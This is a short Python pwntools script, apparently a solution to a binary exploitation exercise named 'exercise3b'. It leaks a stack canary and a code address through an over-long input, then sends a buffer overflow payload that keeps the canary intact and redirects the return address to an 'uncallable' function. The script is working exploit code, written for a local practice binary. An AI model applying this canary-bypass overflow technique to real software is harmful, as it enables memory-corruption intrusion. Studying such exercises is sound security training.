#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

STATIC_PRINT_HELLO_ADDR = 0x1288
STATIC_UNCALLABLE_ADDR = 0x1269

OFFSET = STATIC_PRINT_HELLO_ADDR - STATIC_UNCALLABLE_ADDR
BUF_SIZE = 192




# end with \x0a(\n)
leak = cyclic(BUF_SIZE - 1) + b'\x0a'
while True:
    r = start()
    r.send(leak)

    # the \n at the end creates a new line when printed - skip it - the next line begins with the canary value
    r.recvline_contains(cyclic(8))
    canary_print_addr_raw = r.recvline().split(b' is ')[0]
    canary = int.from_bytes(canary_print_addr_raw[:4], byteorder='little')

    print_hello_addr = int.from_bytes(canary_print_addr_raw[4:], byteorder='little')
    uncallable_addr = print_hello_addr - abs(OFFSET) 
    uncallable_addr = pack(uncallable_addr, 64)

    # while the bytes of the canary will always be > 0x0a(generated as "rand() % 245 + 11")
    # we have no guarantees for the address
    # retry untill we get a good address
    if b'\x0a' in uncallable_addr:
        r.kill()
        continue

    payload = cyclic(BUF_SIZE)
    payload += pack(canary, 64)
    payload += cyclic(32)
    payload += uncallable_addr
    payload += b'\x0a'

    r.recvuntil(b'Enter the secret password:\n')

    r.send(payload)
    a = r.recvall(timeout=3)
    print(a)
    
    break
